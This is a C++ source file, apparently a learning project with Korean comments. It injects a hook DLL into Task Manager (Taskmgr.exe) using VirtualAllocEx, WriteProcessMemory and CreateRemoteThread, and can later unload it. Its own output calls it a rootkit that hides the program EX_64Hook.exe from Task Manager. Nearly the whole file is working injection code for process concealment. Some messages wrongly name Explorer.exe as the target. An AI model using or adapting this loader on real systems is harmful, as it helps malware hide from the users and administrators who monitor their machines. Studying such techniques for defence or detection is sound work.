#include <iostream>
#include <conio.h>
#include <windows.h>
#include <Psapi.h>
#include <tlhelp32.h>
#include <locale.h>

//DLL 빌드모드와 인젝터 빌드모드가 정확히 일치해야함. (Debug, Release)
#define DLL_NAME L"OpenProcess_Hook.dll"
#define DLL_PATH L"C:\\Users\\김기찬\\source\\repos\\OpenProcess_Hook\\x64\\Debug\\OpenProcess_Hook.dll"

// 
// 현재 DLL 설정값: EX_64Hook.exe

HANDLE injectDll(DWORD pid)
{
    HANDLE hTarget = NULL;
    void* pszParam = NULL;
    HANDLE hThread = NULL;
    LPTHREAD_START_ROUTINE pThreadProc = NULL;

    hTarget = ::OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        FALSE, pid);

    if (hTarget == NULL) {
        printf("OpenProcess 실패: %d (관리자 권한 확인 필요)\n", GetLastError());
        return NULL;
    }

    wchar_t szLibPath[] = DLL_PATH;
    SIZE_T dwSize = (wcslen(szLibPath) + 1) * sizeof(wchar_t);

    pszParam = ::VirtualAllocEx(hTarget, NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);
    if (pszParam == NULL) {
        printf("VirtualAllocEx 실패: %d\n", GetLastError());
        goto CLEAN_UP;
    }

    if (!::WriteProcessMemory(hTarget, pszParam, szLibPath, dwSize, NULL)) {
        printf("WriteProcessMemory 실패: %d\n", GetLastError());
        goto CLEAN_UP;
    }

    pThreadProc = (LPTHREAD_START_ROUTINE)::GetProcAddress(
        ::GetModuleHandle(L"kernel32.dll"), "LoadLibraryW"); // 명시적 라이브러리를 호출하는 API 

    hThread = ::CreateRemoteThread(hTarget, NULL, 0, pThreadProc, pszParam, 0, NULL);

    if (hThread == NULL) {
        printf("CreateRemoteThread 실패: %d\n", GetLastError());
        goto CLEAN_UP;
    }

    if (::WaitForSingleObject(hThread, INFINITE) == WAIT_OBJECT_0) {
        puts("--------------------------------------------------");
        puts("*** DLL Injection Success (Rootkit Hooking)  ***");
        puts("--------------------------------------------------");
    }

CLEAN_UP:
    if (hThread) ::CloseHandle(hThread);
    if (hThread == NULL) {
        if (hTarget) ::CloseHandle(hTarget);
        return NULL;
    }
    return hTarget;
}

void ejectDll(HANDLE hTarget, DWORD pid)
{
    HANDLE hSnapshot = ::CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid);
    if (hSnapshot == INVALID_HANDLE_VALUE) return;

    MODULEENTRY32 me = { sizeof(me) };
    BOOL bFlag = Module32First(hSnapshot, &me);
    for (; bFlag; bFlag = Module32Next(hSnapshot, &me))
    {
        if (_wcsicmp(me.szModule, DLL_NAME) == 0)
        {
            LPTHREAD_START_ROUTINE pThreadProc = (LPTHREAD_START_ROUTINE)
                ::GetProcAddress(GetModuleHandle(L"kernel32.dll"), "FreeLibrary");

            HANDLE hThread = CreateRemoteThread(hTarget, NULL, 0, pThreadProc, me.modBaseAddr, 0, NULL);
            if (hThread != NULL)
            {
                ::WaitForSingleObject(hThread, INFINITE);
                ::CloseHandle(hThread);
                puts("\n*** Hook Unloaded (Visible again) ***");
            }
            break;
        }
    }
    ::CloseHandle(hSnapshot);
}

DWORD getTaskMgrPid(void)
{
    DWORD aPid[1024] = { 0 }, dwNeeded = 0;
    if (::EnumProcesses(aPid, sizeof(aPid), &dwNeeded))
    {
        for (DWORD i = 0; i < (dwNeeded / sizeof(DWORD)); ++i)
        {
            if (aPid[i] == 0) continue;
            // 권한을 충분히 주어 오픈합니다.
            HANDLE hProcess = ::OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ, FALSE, aPid[i]);
            if (hProcess != NULL)
            {
                TCHAR name[MAX_PATH] = { 0 };
                if (::GetModuleBaseName(hProcess, NULL, name, MAX_PATH))
                {
                    // 타겟을 Taskmgr.exe로 변경!
                    if (_wcsicmp(name, L"Taskmgr.exe") == 0)
                    {
                        ::wprintf(L"작업 관리자 발견: %s [PID: %d]\n", name, aPid[i]);
                        ::CloseHandle(hProcess);
                        return aPid[i];
                    }
                }
                ::CloseHandle(hProcess);
            }
        }
    }
    return 0;
}
int main()
{
    setlocale(LC_ALL, "");

    DWORD pid = getTaskMgrPid();
    if (pid == 0) {
        puts("ERROR: Explorer.exe를 찾을 수 없습니다.");
        return 0;
    }

    HANDLE hProcess = injectDll(pid);
    if (hProcess == NULL) return 0;

    puts("Successfully injected Rootkit DLL into Explorer.exe!");
    printf("[!] 은폐 대상: %s\n", "EX_64Hook.exe");
    puts("[!] 이제 작업 관리자(세부 정보 탭)에서 이 프로그램이 사라졌는지 확인하세요.");
    puts(">> 'q'를 누르면 은폐를 해제하고 종료합니다...");

    while (_getch() != 'q');

    ejectDll(hProcess, pid);
    ::CloseHandle(hProcess);

    return 0;
}
